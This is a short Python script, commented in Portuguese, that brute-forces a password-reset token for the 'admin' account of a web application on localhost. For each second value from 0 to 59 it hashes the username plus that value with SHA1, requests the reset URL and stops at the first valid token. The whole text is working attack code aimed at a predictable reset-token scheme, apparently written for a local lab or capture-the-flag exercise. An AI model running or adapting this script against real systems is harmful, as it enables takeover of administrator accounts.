import hashlib
import requests

username = "admin"
base_url = "http://localhost:5000/reset/admin/"

for second in range(60):
    # Gerar token
    to_hash = username + str(second)
    token = hashlib.sha1(
        to_hash.encode('utf-8')
    ).hexdigest()

    url = base_url + token

    # Fazer requisição
    response = requests.get(url)

    print(f"Testando segundo {second} -> {token} | Status: {response.status_code}")

    # Se retornar 200 e não for página de erro
    if response.status_code == 200 and "Invalid" not in response.text:
        print("\n[+] TOKEN VÁLIDO ENCONTRADO!")
        print("Segundo:", second)
        print("Token:", token)
        break
